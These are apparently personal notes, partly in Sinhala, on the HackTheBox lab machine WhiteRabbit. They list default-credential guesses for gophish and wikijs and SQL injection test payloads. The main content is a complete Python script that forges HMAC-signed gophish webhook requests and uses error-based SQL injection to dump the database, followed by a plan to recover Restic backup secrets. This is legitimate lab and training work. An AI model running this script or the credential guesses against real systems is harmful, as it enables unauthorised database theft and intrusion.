![[Pasted image 20260104213048.png]]


![[Pasted image 20260104213110.png]]


![[Pasted image 20260104214209.png]]


find the Subdomain
![[Pasted image 20260105173907.png]]
```
http://status.whiterabbit.htb
```




found /status
```
http://status.whiterabbit.htb/status
```

![[Pasted image 20260105194224.png]]


![[Pasted image 20260105194247.png]]


### **වැදගත් නම්:**

- **gophish** → Phishing platform (අනතුරුදායක!)
    
- **n8n** → Workflow automation tool
    
- **wikijs** → Wiki/documentation system
    
- **website** → ප්‍රධාන වෙබ් අඩවිය

## **විශේෂයෙන් අවධානය යොමු කළ යුතු කරුණු:**

### **gophish ගැන සැලකිලිමත් වන්න:**

- Phishing platform එකක්
    
- Default credentials: `admin:gophish`
    
- **මෙයට ප්‍රවේශය ලැබුණොත් ඉතාමත් අනතුරුදායකයි!**
    

### **wikijs (DEV):**

- Development environment වල default credentials තිබිය හැකියි
    
- උදා: `admin:admin`, `admin:password`, `admin:123456`



![[Pasted image 20260105210606.png]]

![[Pasted image 20260105210623.png]]
We update our /etc/hosts file to add the 28efa8f7df.whiterabbit.htb subdomain. Analysing the gophish_to_phishing_score_database.json reveals a potential SQL injection:

```
"parameters": { 
	"operation": "executeQuery", 
	"query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1", 
	"options": {} },
```

This code will result in a direct injection for the email field and it should be possible to get an error based SQL injection because the debug node will provide the error messages. But there are some limitations. The HTTP request shown in the article works fine, but changing any data in the body will result in a failure because of the signature check that happens before any data is submitted to the database. This is because GoPhish webhooks can use a secret to sign the messages they send according to the documentation. Fortunately, the secret for the HMAC calculation is also leaked in the workflow JSON file and the information about the signing are available in the workflow and the GoPhish documentation


```

"parameters": { 
	"action": "hmac", 
	"type": "SHA256", 
	"value": "={{ JSON.stringify($json.body) }}", 
	"dataPropertyName": "calculated_signature", 
	"secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS" 
},

```



![[Pasted image 20260105222536.png]]



![[Pasted image 20260105222818.png]]


![[Pasted image 20260105223838.png]]


![[Pasted image 20260105225914.png]]

Output එක වෙනස් උනොත් = **SQL Injection confirmed**

![[Pasted image 20260105225817.png]]


![[Pasted image 20260107003246.png]]


Payload A:

`{ "email": "'" }`

Payload B:

`{ "email": "' OR 1=1 -- " }`

👉 **Response දෙකම එකමයි**

`Info: User is not in database`

---

# 🧠 STEP 1: මෙයින් හරියටම තේරෙන්නේ මොනවාද?

### ❗ වැරදි තේරුම (NO)

> “SQL Injection නැහැ”

❌ මේ conclusion එක **වැරදි**

---

### ✅ හරි තේරුම (YES)

> **SQL Injection code එක DB එකට යන්න කලින් block වෙනවා**




![[Pasted image 20260106222149.png]]



![[Pasted image 20260106234105.png]]



![[Pasted image 20260107003425.png]]


![[Pasted image 20260107011556.png]]


![[Pasted image 20260107012116.png]]


## OR 

using Python script we can send request for the SQL_Injections  

```

import requests
import hmac
import hashlib
import json
import re

# --------------------------------------------------
# Create signed payload (tamper function)
# --------------------------------------------------
def tamper(payload):
    params = '{"campaign_id":1,"email":"%s","message":"Clicked Link"}' % payload
    secret = '3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'.encode('utf-8')

    payload_bytes = params.encode("utf-8")
    signature = 'sha256=' + hmac.new(secret, payload_bytes, hashlib.sha256).hexdigest()

    params = json.loads(params)
    return params, signature


# --------------------------------------------------
# Send request & extract error-based output
# --------------------------------------------------
def extract_value(url, payload_template, rhost, **kwargs):
    payload = payload_template.format(**kwargs)
    params, signature = tamper(payload)

    headers = {
        "Host": "28efa8f7df.whiterabbit.htb",
        "x-gophish-signature": signature
    }

    proxies = {"http": "http://127.0.0.1:8080"}

    try:
        response = requests.post(
            url,
            json=params,
            headers=headers,
            proxies=proxies,
            timeout=10
        )
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return None

    match = re.search(r"~([^~]+)~", response.text, re.DOTALL)
    if match:
        return match.group(1)

    return None


# --------------------------------------------------
# Extract Databases
# --------------------------------------------------
def extract_databases(url, rhost):
    databases = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, '
        r'(SELECT schema_name FROM information_schema.schemata '
        r'WHERE schema_name NOT LIKE \"information_schema\" '
        r'LIMIT {offset},1), 0x7e), 1);'
    )

    offset = 0
    while True:
        db = extract_value(url, payload_template, rhost, offset=offset)
        if db and db not in databases:
            databases.append(db)
            offset += 1
        else:
            break

    return databases


# --------------------------------------------------
# Extract Tables
# --------------------------------------------------
def extract_tables(url, rhost, db):
    tables = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, '
        r'(SELECT table_name FROM information_schema.tables '
        r'WHERE table_schema=\"{db}\" LIMIT {offset},1), 0x7e), 1);'
    )

    offset = 0
    while True:
        table = extract_value(url, payload_template, rhost, db=db, offset=offset)
        if table and table not in tables:
            tables.append(table)
            offset += 1
        else:
            break

    return tables


# --------------------------------------------------
# Extract Columns
# --------------------------------------------------
def extract_columns(url, rhost, db, table):
    columns = []
    payload_template = (
        r'\" OR updatexml(1, concat(0x7e, '
        r'(SELECT column_name FROM information_schema.columns '
        r'WHERE table_schema=\"{db}\" AND table_name=\"{table}\" '
        r'LIMIT {offset},1), 0x7e), 1);'
    )

    offset = 0
    while True:
        column = extract_value(url, payload_template, rhost, db=db, table=table, offset=offset)
        if column and column not in columns:
            columns.append(column)
            offset += 1
        else:
            break

    return columns


# --------------------------------------------------
# Extract Full Data using substring (error-based)
# --------------------------------------------------
def extract_all_data(url, rhost, table, column):
    data_rows = []

    for id_val in range(1, 7):
        row_data = ""
        pos = 1
        chunk_size = 18

        while True:
            payload_template = (
                r'\" OR updatexml(1, concat(0x7e, ('
                r'SELECT SUBSTRING({column}, {pos}, {chunk_size}) '
                r'FROM temp.{table} WHERE id={id_val}'
                r'), 0x7e), 1)-- '
            )

            data = extract_value(
                url,
                payload_template,
                rhost,
                column=column,
                table=table,
                pos=pos,
                chunk_size=chunk_size,
                id_val=id_val
            )

            if not data:
                break

            row_data += data
            if len(data) < chunk_size:
                break

            pos += chunk_size

        if row_data.strip():
            data_rows.append((id_val, row_data))

    return data_rows


# --------------------------------------------------
# Main controller
# --------------------------------------------------
def perform_sql_injection(rhost):
    print("[i] Starting SQL Injection...")
    url = f"http://{rhost}/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"

    databases = extract_databases(url, rhost)
    for db in databases:
        print(f"[+] Database: {db}")

        tables = extract_tables(url, rhost, db)
        for table in tables:
            print(f"[+] Table: {table}")

            columns = extract_columns(url, rhost, db, table)
            for column in columns:
                print(f"[+] Column: {column}")

                rows = extract_all_data(url, rhost, table, column)
                for row in rows:
                    print(f"[DATA] {row}")


# --------------------------------------------------
if __name__ == "__main__":
    rhost = "10.10.11.63"
    perform_sql_injection(rhost)


```

### Output : 
![[Pasted image 20260107215533.png]]


“Server එකේ backup (Restic) තියෙන file ටික නැවත open කරන එක”

## Restic කියන්නේ මොනවද?

**Restic = backup software**

එකෙන්:

- `/home`
    
- `/root`
    
- `.ssh`
    
- passwords
    
- config files
    

backup කරලා තියෙනවා

⚠️ Backup කියන්නේ **past version of the server**

### STEP 1 – Logs බලලා මෙන්න මේ දෙක හොයාගන්න

command_log table එකෙන්:

1️⃣ **Repository path**  
2️⃣ **Restic password**
![[Pasted image 20260107230124.png]]


![[Pasted image 20260107225908.png]]


![[Pasted image 20260107230251.png]]


![[Pasted image 20260107231835.png]]


![[Pasted image 20260107231938.png]]


![[Pasted image 20260108001350.png]]


![[Pasted image 20260108000456.png]]


![[Pasted image 20260108000635.png]]


![[Pasted image 20260108000652.png]]




![[Pasted image 20260108002120.png]]



![[Pasted image 20260108002548.png]]



![[Pasted image 20260108002601.png]]



![[Pasted image 20260108002812.png]]






